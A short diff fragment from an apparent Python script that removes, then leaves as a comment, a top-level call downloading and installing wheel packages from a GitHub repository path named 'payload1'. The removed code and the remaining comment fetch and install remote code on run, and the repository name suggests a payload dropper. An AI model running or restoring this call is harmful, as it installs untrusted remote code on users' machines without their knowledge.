@@ -61,7 +61,5 @@ def download_and_install_whl(url, filename):
     except Exception as e:
         print(f"Error downloading or installing whl: {e}")
 
-repo_url = 'https://api.github.com/repos/slayy2357/payload1/contents/modules'
-download_and_install_whls(repo_url)
-
-print("All required whl packages are installed and ready to use.")
+#Install modules :
+#download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
